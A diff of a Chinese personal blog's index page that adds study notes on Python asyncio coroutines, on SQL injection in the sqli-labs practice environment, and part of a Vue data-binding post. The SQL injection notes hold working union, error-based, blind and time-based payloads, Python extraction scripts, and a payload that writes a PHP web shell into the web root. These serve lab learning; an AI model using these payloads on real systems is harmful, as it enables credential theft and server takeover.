@@ -43,7 +43,7 @@
     <h2 class="author">John Doe</h2>
     <h3 class="description"></h3>
     <div class="count-box">
-      <a href="/archives"><div><strong>38</strong><br>文章</div></a>
+      <a href="/archives"><div><strong>43</strong><br>文章</div></a>
       <a href="/categories"><div><strong>0</strong><br>分类</div></a>
       <a href="/tags"><div><strong>1</strong><br>标签</div></a>
     </div>
@@ -70,6 +70,555 @@
 </div>
 
         <section id="main">
+  
+    <article id="post-爬虫-逆向爬虫" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/12/20/%E7%88%AC%E8%99%AB-%E9%80%86%E5%90%91%E7%88%AC%E8%99%AB/" class="article-date">
+  <time class="post-time" datetime="2023-12-20T12:02:00.000Z" itemprop="datePublished">
+    <span class="post-month">12月</span><br/>
+    <span class="post-day">20</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/12/20/%E7%88%AC%E8%99%AB-%E9%80%86%E5%90%91%E7%88%AC%E8%99%AB/">爬虫_逆向爬虫</a>
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>发送请求到浏览器时，等待服务器回应会消耗大量的时间，这时cpu是停止的状态，称之为阻塞。</p>
+<p>IO（输入，输出）操作最容易引起阻塞。</p>
+<h2 id="携程"><a href="#携程" class="headerlink" title="携程"></a>携程</h2><h3 id="携程基础"><a href="#携程基础" class="headerlink" title="携程基础"></a>携程基础</h3><p>协程是我要重点去讲解的一个知识点，它能够更加高效的利用CPU.</p>
+<p>event loop 携程中检查是否有请求结束了IO。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231220202557370.png" alt="image-20231220202557370"></p>
+<p>就形成了这样一种模型,在程序遇到了IO操作(费时不费力的操作)时,自动切换到其他任务.该模型被称为协程.</p>
+<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import asyncio</span><br><span class="line"></span><br><span class="line">async def func():</span><br><span class="line">  print(&quot;我是&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;: #程序入口</span><br><span class="line"></span><br><span class="line">  f = func()</span><br><span class="line">  # 携程对象想要执行，必须借助与 event_loop</span><br><span class="line">  loop = asyncio.get_event_loop()</span><br><span class="line">  # event_loop执行携程对象，直到对象内容执行完毕为止</span><br><span class="line">  loop.run_until_complete(f)</span><br><span class="line"></span><br><span class="line">  asyncio.run(func())</span><br><span class="line">  # 如果电脑报错：Event loop has closed !!!</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231220205928743.png" alt="image-20231220205928743"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">import asyncio</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">async def main():</span><br><span class="line">  print(&quot;Hello&quot;)</span><br><span class="line">  await asyncio.sleep(1)</span><br><span class="line">  print(&quot;World!&quot;)</span><br><span class="line"></span><br><span class="line">async def main1():</span><br><span class="line">  print(&quot;Hello1&quot;)</span><br><span class="line">  await asyncio.sleep(2)</span><br><span class="line">  print(&quot;World!1&quot;)</span><br><span class="line"></span><br><span class="line">async def main2():</span><br><span class="line">  print(&quot;Hello2&quot;)</span><br><span class="line">  await asyncio.sleep(3)</span><br><span class="line">  print(&quot;World!2&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    start = time.time()</span><br><span class="line">  # f = main()</span><br><span class="line">  # f1 = main1()</span><br><span class="line">  # f2 = main2()</span><br><span class="line">  # #把三个任务放在一起</span><br><span class="line">  # tasks = [</span><br><span class="line">  #   f,</span><br><span class="line">  #   f1,</span><br><span class="line">  #   f2,</span><br><span class="line">  # ]</span><br><span class="line">    async def run_tasks():</span><br><span class="line">      f = main()</span><br><span class="line">      f1 = main1()</span><br><span class="line">      f2 = main2()</span><br><span class="line">      await asyncio.gather(f, f1, f2)</span><br><span class="line">  # loop = asyncio.get_event_loop()</span><br><span class="line">  # loop.run_until_complete(tasks)</span><br><span class="line">    asyncio.run(run_tasks())</span><br><span class="line">    print(time.time() - start)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231228173315092.png" alt="image-20231228173315092"></p>
+<h3 id="携程返回值"><a href="#携程返回值" class="headerlink" title="携程返回值"></a>携程返回值</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">import asyncio</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">async def main():</span><br><span class="line">  print(&quot;我是main&quot;)</span><br><span class="line">  await asyncio.sleep(1)</span><br><span class="line">  print(&quot;main结束!&quot;)</span><br><span class="line">  return &quot;main的返回值&quot;</span><br><span class="line"></span><br><span class="line">async def main1():</span><br><span class="line">  print(&quot;我是main1&quot;)</span><br><span class="line">  await asyncio.sleep(2)</span><br><span class="line">  print(&quot;main1结束!&quot;)</span><br><span class="line"></span><br><span class="line">async def main2():</span><br><span class="line">  print(&quot;我是main2&quot;)</span><br><span class="line">  # print(1/0)</span><br><span class="line">  await asyncio.sleep(3)</span><br><span class="line">  print(&quot;main2结束!&quot;)</span><br><span class="line"></span><br><span class="line">async def main3():</span><br><span class="line">  f1 = main()</span><br><span class="line">  f2 = main1()</span><br><span class="line">  f3 = main2()</span><br><span class="line">  tasks = [</span><br><span class="line">    asyncio.create_task(f1),</span><br><span class="line">    asyncio.create_task(f2),</span><br><span class="line">    asyncio.create_task(f3)</span><br><span class="line">  ]</span><br><span class="line">  # #结束，运行</span><br><span class="line">  # # set集合：无序</span><br><span class="line">  # done, pending = await asyncio.wait(tasks)</span><br><span class="line">  # # print(done)</span><br><span class="line">  # # print(pending)</span><br><span class="line">  # for t in done:</span><br><span class="line">  #   print(t.result())</span><br><span class="line">  </span><br><span class="line">  # gather 和 wait的区别：gather有序</span><br><span class="line">  result = await asyncio.gather(*tasks,return_exceptions=True)#return_exceptions=False 有错误信息，所有任务停止；return_exceptions=True 有错误信息，返回错误信息，其他任务继续执行。</span><br><span class="line">  print(result)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">  asyncio.run(main3())</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231228195356587.png" alt="image-20231228195356587"></p>
+<h3 id="列子，电影爬取"><a href="#列子，电影爬取" class="headerlink" title="列子，电影爬取"></a>列子，电影爬取</h3><p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240102200730574.png" alt="image-20240102200730574"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/12/20/%E7%88%AC%E8%99%AB-%E9%80%86%E5%90%91%E7%88%AC%E8%99%AB/" data-id="clqhz8pno00037ku49p6l1ilm" class="article-share-link">分享</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+  
+    <article id="post-SQL注入-sqli" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/12/20/SQL%E6%B3%A8%E5%85%A5-sqli/" class="article-date">
+  <time class="post-time" datetime="2023-12-20T07:02:42.000Z" itemprop="datePublished">
+    <span class="post-month">12月</span><br/>
+    <span class="post-day">20</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/12/20/SQL%E6%B3%A8%E5%85%A5-sqli/">SQL注入_sqli</a>
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="火狐插件-HackBar"><a href="#火狐插件-HackBar" class="headerlink" title="火狐插件_HackBar"></a>火狐插件_HackBar</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>打开扩展和主题</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231220150816066.png" alt="image-20231220150816066"></p>
+<p>打开扩展，点击重文件安装附加组件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231220151147983.png" alt="image-20231220151147983"></p>
+<p>选择hackbar插件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231220151302114.png" alt="image-20231220151302114"></p>
+<p>就可以在管理器中使用</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231220192507765.png" alt="image-20231220192507765"></p>
+<h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231220192608314.png" alt="image-20231220192608314"></p>
+<blockquote>
+<p>Load URL ：是将你所在的网站地址显示在右边框里</p>
+<p>Execute：是将右边的网站运行</p>
+<p>ADD”&#x2F;“：是在网站最右边加”&#x2F;“</p>
+</blockquote>
+<h3 id="SQl注入"><a href="#SQl注入" class="headerlink" title="SQl注入"></a>SQl注入</h3><p>information_schema 在mysql5.0后出现（SQL注入）</p>
+<p>回显位</p>
+<p>limit 0,1 重0开始输出一个结束。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231221095915785.png" alt="image-20231221095915785"></p>
+<h4 id="查看security库的表名"><a href="#查看security库的表名" class="headerlink" title="查看security库的表名"></a>查看security库的表名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database();</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231220160334354.png" alt="image-20231220160334354"></p>
+<p>查找information_schema库中tables表中table_schema&#x3D;database()</p>
+<p>查security库的表名</p>
+<h4 id="查看security库的user的所有列名"><a href="#查看security库的user的所有列名" class="headerlink" title="查看security库的user的所有列名"></a>查看security库的user的所有列名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,group_concat(column_name) ,3 from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=database();</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231220161543850.png" alt="image-20231220161543850"></p>
+<h4 id="查看security库的user所有信息"><a href="#查看security库的user所有信息" class="headerlink" title="查看security库的user所有信息"></a>查看security库的user所有信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(id,&quot;~&quot;,username,&quot;~&quot;,password) from users ;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231220155123038.png" alt="image-20231220155123038"></p>
+<h4 id="网页中获取库"><a href="#网页中获取库" class="headerlink" title="网页中获取库"></a>网页中获取库</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli/Less-1/?id=-1&#x27; union select 1, (select group_concat(id,&quot;~&quot;,username,&quot;~&quot;,password) from users),3;-- -</span><br><span class="line">或</span><br><span class="line">http://localhost/sqli/Less-1/?id=-1&#x27; union select 1,  group_concat(id,&quot;~&quot;,username,&quot;~&quot;,password),3  from users;-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231220165811834.png" alt="image-20231220165811834"></p>
+<h4 id="网页中获取用户为flag的信息，列子"><a href="#网页中获取用户为flag的信息，列子" class="headerlink" title="网页中获取用户为flag的信息，列子"></a>网页中获取用户为flag的信息，列子</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//拼接sql语句查找指定ID用户</span><br><span class="line">$sql = &quot;select username,password from user where username !=&#x27;flag&#x27; and id = &#x27;&quot;.$_GET[&#x27;id&#x27;].&quot;&#x27; limit 1;&quot;;</span><br></pre></td></tr></table></figure>
+
+<h5 id="用o"><a href="#用o" class="headerlink" title="用o"></a>用o</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27; or username=&#x27;flag&#x27; -- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231220170522705.png" alt="image-20231220170522705"></p>
+<h5 id="查库"><a href="#查库" class="headerlink" title="查库"></a>查库</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#获取库名</span><br><span class="line">0&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database();-- -</span><br><span class="line">#查到库的名字为ctfshow_user</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231220171335615.png" alt="image-20231220171335615"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#查看ctfshow_user表的所有列名</span><br><span class="line">0&#x27; union select 1,group_concat(column_name) ,3 from information_schema.columns where table_name=&#x27;ctfshow_user&#x27; and table_schema=database();-- -</span><br><span class="line">#查到id,username,password</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231220191451862.png" alt="image-20231220191451862"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#查看ctfshow_user表中username=&#x27;flag&#x27;的内容</span><br><span class="line">0&#x27; union select 1,  group_concat(id,&quot;~&quot;,username,&quot;~&quot;,password),3  from ctfshow_user where username=&#x27;flag&#x27;;-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231220192055331.png" alt="image-20231220192055331"></p>
+<ul>
+<li>order by n查看第n列</li>
+</ul>
+<p>ctfshow_user,ctfshow_user2</p>
+<p>id,username,password</p>
+<h3 id="sql报错语句"><a href="#sql报错语句" class="headerlink" title="sql报错语句"></a>sql报错语句</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.70/sqli/Less-5/?id=1 &#x27;and (extractvalue(1,concat(0x7e,(select user()),0x7e)))-- -</span><br><span class="line"></span><br><span class="line">*(select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br><span class="line"></span><br><span class="line">*(extractvalue(1,concat(0x7e,(select user()),0x7e)))</span><br><span class="line"></span><br><span class="line">*(updatexml(1,concat(0x7e,(select user()),0x7e),1))</span><br><span class="line"></span><br><span class="line">geometrycollection((select * from(select * from(select user())a)b))</span><br><span class="line"></span><br><span class="line">multipoint((select * from(select * from(select user())a)b))</span><br><span class="line"></span><br><span class="line">polygon((select * from(select * from(select user())a)b))</span><br><span class="line"></span><br><span class="line">multipolygon((select * from(select * from(select user())a)b))</span><br><span class="line"></span><br><span class="line">linestring((select * from(select * from(select user())a)b))</span><br><span class="line"></span><br><span class="line">multilinestring((select * from(select * from(select user())a)b))</span><br><span class="line"></span><br><span class="line">*exp(~(select * from(select user())a))</span><br></pre></td></tr></table></figure>
+
+<p>将user()换成SQL注入</p>
+<h4 id="列子-第五关"><a href="#列子-第五关" class="headerlink" title="列子 第五关"></a>列子 第五关</h4><p>sqli第五关</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.70/sqli/Less-5/?id=1 &#x27;and (select 1 from (select count(*),concat((select group_concat(id) from users ),floor(rand(0)*2))x from information_schema.tables group by x)a)-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231221144755669.png" alt="image-20231221144755669"></p>
+<h4 id="第8关，sql注入脚本盲注"><a href="#第8关，sql注入脚本盲注" class="headerlink" title="第8关，sql注入脚本盲注"></a>第8关，sql注入脚本盲注</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">使用ascii码获取表。</span><br><span class="line">id=1&#x27;and ascii(substring(database(),1,1))=115--+</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#id=1&#x27;and ascii(substring(database(),1,1))=115--+</span><br><span class="line">import requests</span><br><span class="line">session = requests.Session()</span><br><span class="line"># url = &quot;http://192.168.2.70/sqli/Less-8/?id=1&#x27;&quot;</span><br><span class="line">def erfen(url):</span><br><span class="line">  name = &quot;&quot;</span><br><span class="line">  for i in range(1,50):</span><br><span class="line">    a = int(32)</span><br><span class="line">    b = int(128)</span><br><span class="line">    d = (a + b)//2</span><br><span class="line">    while a &lt; b :</span><br><span class="line">      Get = url + &quot;/**/and/**/ascii(substr(database(),&#123;0&#125;,1))&gt;&#123;1&#125;--+&quot;.format(i,d)</span><br><span class="line">      res = session.get(Get)</span><br><span class="line">      if &#x27;You are in...........&#x27; in res.text:</span><br><span class="line">        a = d + 1</span><br><span class="line">        d = (a + b)//2</span><br><span class="line">      else:</span><br><span class="line">        b = d</span><br><span class="line">        d = (a + b)//2</span><br><span class="line">    if d == 32:</span><br><span class="line">      break</span><br><span class="line">    name += chr(d)</span><br><span class="line">  return name</span><br><span class="line">    # print(name)</span><br><span class="line"># erfen()</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">  url = &quot;http://192.168.2.70/sqli/Less-8/?id=1&#x27;&quot;</span><br><span class="line">  name = erfen(url)</span><br><span class="line">  print(name)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231221193850425.png" alt="image-20231221193850425"></p>
+<h3 id="sql-injection函数"><a href="#sql-injection函数" class="headerlink" title="sql injection函数"></a>sql injection函数</h3><p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231221151918687.png" alt="image-20231221151918687"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231221151937380.png" alt="image-20231221151937380"></p>
+<h3 id="睡眠注入"><a href="#睡眠注入" class="headerlink" title="睡眠注入"></a>睡眠注入</h3><p>用if语句判断是否成立，不成立者进行睡眠。来判断是否能进行SQL注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and If(ascii(substr(database(),1,1))=115,1,sleep(5))-- -</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># ?id=1&#x27; and if(ascii(substr(database(),1,1))= 115,sleep(5),0) --+</span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">tr=&#x27;username&#x27;</span><br><span class="line">name=&#x27;&#x27;</span><br><span class="line">url1=&quot;http://192.168.2.8/sqli/Less-9/?id=1&#x27;&quot;</span><br><span class="line">for j in range(1,10):</span><br><span class="line">  for i in range(65,123):</span><br><span class="line">    url=url1+&quot;and if( ascii(substring(database(),&quot;+str(j)+&quot;,1))= &quot;+str(i)+&quot;,sleep(3),1)-- -&quot;</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    response = requests.get(url)</span><br><span class="line">    end_time = time.time()</span><br><span class="line">    elapsed_time = end_time - start_time</span><br><span class="line">    if elapsed_time &gt; 3: # 如果响应时间超过5秒</span><br><span class="line">      name=name+chr(i)</span><br><span class="line">      print(name)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231223211008350.png" alt="image-20231223211008350"></p>
+<h3 id="注入webshell，文本注入"><a href="#注入webshell，文本注入" class="headerlink" title="注入webshell，文本注入"></a>注入webshell，文本注入</h3><p>@@datadir 查看mysql路径</p>
+<p>@@secure_file_priv 查看限制</p>
+<p>打开phpstudy中的MySQL配置文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231222144701150.png" alt="image-20231222144701150"></p>
+<p>在mysqld里面添加</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secure_file_priv=&quot;&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231222145859528.png" alt="image-20231222145859528"></p>
+<p>再将phpstudy的mysql进行重启</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231222150318949.png" alt="image-20231222150318949"></p>
+<p>在网站中输入下方代码，在网站根目录下WWW中添加phpinfo.php文件。并将‘<?php @system($_GET[a]);  ?>’写入phpinfo.php文件中。相当于写了一个后门。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.8/sqli/Less-1/?id=-1&#x27; union select 1,@@datadir,&quot;&lt;?php @system($_GET[a]);  ?&gt;&quot; into outfile &quot;C:\\phpstudy_pro\\WWW\\phpinfo.php&quot; -- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231222153356329.png" alt="image-20231222153356329"></p>
+<p>这时就可以在WWW根目录下找到phpinfo.php文件。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231222153434535.png" alt="image-20231222153434535"></p>
+<p>这时在网站中打开phpinfo.php文件。就可以进行一些查找命令。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231222163353266.png" alt="image-20231222163353266"></p>
+<h3 id="参数污染"><a href="#参数污染" class="headerlink" title="参数污染"></a>参数污染</h3><p>访问以下URL : <a target="_blank" rel="noopener" href="http://www.xxx.com/?%60id=1&&id=2%60%EF%BC%8C%E4%B8%8D%E5%90%8C%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%AF%E8%83%BD%E8%8E%B7%E5%BE%97%E4%B8%8D%E5%90%8C%E7%9A%84%E4%BC%A0%E5%8F%82%E7%BB%93%E6%9E%9C">http://www.xxx.com/?`id=1&amp;&amp;id=2`，不同服务器可能获得不同的传参结果</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">服务器1：获得id=1</span><br><span class="line">服务器2：获得id=2</span><br><span class="line">服务器3：获得id=12</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/12/20/SQL%E6%B3%A8%E5%85%A5-sqli/" data-id="clqhz8pnf00007ku43uklep56" class="article-share-link">分享</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+  
+    <article id="post-数据绑定" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/12/17/%E6%95%B0%E6%8D%AE%E7%BB%91%E5%AE%9A/" class="article-date">
+  <time class="post-time" datetime="2023-12-17T02:07:44.000Z" itemprop="datePublished">
+    <span class="post-month">12月</span><br/>
+    <span class="post-day">17</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/12/17/%E6%95%B0%E6%8D%AE%E7%BB%91%E5%AE%9A/">数据绑定和数据交互</a>
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="Vue-绑定文本："><a href="#Vue-绑定文本：" class="headerlink" title="Vue 绑定文本："></a><strong>Vue 绑定文本：</strong></h3><p>数据绑定最常见的形式就是使用 “Mustache” 语法（双大括号）的文本插值，比如模板引擎：handlebars 中就是用的<code>&#123;&#123;&#125;&#125;。</code>创建的 Vue 对象中的 data 属性就是用来绑定数据到 HTML 的。如：</p>
